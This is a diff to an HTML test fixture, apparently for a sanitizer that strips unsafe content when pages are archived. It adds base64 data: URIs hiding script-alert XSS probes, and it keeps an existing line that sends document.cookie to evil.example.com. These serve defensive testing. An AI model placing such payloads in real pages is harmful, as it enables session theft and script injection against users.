@@ -11,6 +11,16 @@
   and here is <a href="/relative/page">a genuinely relative one</a> that has to be
   resolved before it is stored, or it will resolve against the archive instead.</p>
   <p><img src="../images/photo.jpg" srcset="../images/photo-480.jpg 480w, ../images/photo-960.jpg 960w" alt="A photograph"></p>
+
+  <!-- An inline image: the bytes are the picture, so there is nothing to fetch and
+       nobody to reach. It survives. -->
+  <p><img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="An inline pixel"></p>
+
+  <!-- Two data: URIs that are not images, and one image type that carries script.
+       None of these may survive: an SVG is a document, and text/html is a page. -->
+  <p><img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="not an image"></p>
+  <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=" alt="svg with script"></p>
+  <p><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">not a link</a></p>
   <script>fetch('https://evil.example.com/collect?c=' + document.cookie);</script>
   <iframe src="https://tracker.example.com/pixel"></iframe>
   <p>The body text itself is ordinary and should come through intact, which is the
